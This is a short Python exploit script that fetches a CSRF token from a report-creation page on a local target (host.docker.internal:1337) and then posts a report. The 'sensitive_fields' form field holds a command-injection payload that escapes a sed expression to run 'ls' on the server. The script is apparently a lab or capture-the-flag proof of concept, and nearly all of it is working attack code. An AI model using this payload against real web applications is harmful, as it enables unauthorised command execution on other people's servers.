import requests
import re
import sys

# Replace with the actual URL
url = "http://host.docker.internal:1337/reports"
create_url = "http://host.docker.internal:1337/reports/create"

# Function to get the CSRF token
def get_csrf_token(session):
    try:
        response = session.get(create_url)
        response.raise_for_status()
        match = re.search(r'<input type="hidden" name="_token" value="([^"]+)">', response.text)
        if match:
            return match.group(1)
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")
        return None
    return None

# Create a session
with requests.Session() as session:
    # Get the CSRF token
    csrf_token = get_csrf_token(session)
    if not csrf_token:
        print("Failed to retrieve CSRF token.")
        sys.exit(1)

    # Craft the payload
    payload = {
        "_token": csrf_token,
        "title": "test",
        "description": "test",
        "sensitive_fields": "sed -i 's/.*//g; ls #",
        "chart_type": "bar",
        "x_axis": "name",
        "y_axis": "income"
    }

    # Send the POST request
    files = {'csv_file': ('test.csv', 'name,email,phone,age,income,sales\nJohn Doe,john@example.com,555-1234,35,75000,120')}
    try:
        response = session.post(url, data=payload, files=files)
        response.raise_for_status()
        print(f"Status code: {response.status_code}")
        print(response.text)
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")